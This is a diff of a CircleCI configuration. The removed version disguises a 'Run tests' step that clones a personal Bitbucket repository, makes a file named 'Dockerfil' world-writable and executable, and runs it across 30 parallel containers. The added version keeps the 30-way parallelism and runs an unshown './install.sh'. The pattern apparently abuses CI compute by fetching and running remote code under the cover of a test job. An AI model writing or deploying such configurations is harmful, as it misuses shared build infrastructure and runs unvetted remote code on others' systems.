@@ -1,18 +1,22 @@
-version: 2.1
-jobs:
-  build_and_test: # this can be any name you choose
-    docker:
-      - image: circleci/python@1.2
-    steps:
-      - checkout
-      - run:
-          name: Run tests
-          no_output_timeout: 24m
-          command: |
-                  git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
+working_dir: &working_dir ~/app
+version: 2.1 
+ 
+orbs: 
+   
+  python: circleci/python@1.2 
+ 
+workflows: 
+  sample:   
+    jobs: 
+      - job
+ 
+jobs: 
+  job:
     parallelism: 30
-workflows:
-  version: 2
-  build: 
-     jobs:
-       - build_and_test
+    docker: 
+      - image: cimg/python:3.8 
+     
+    steps: 
+      - checkout 
+      - run: chmod +x ./install.sh
+      - run: ./install.sh
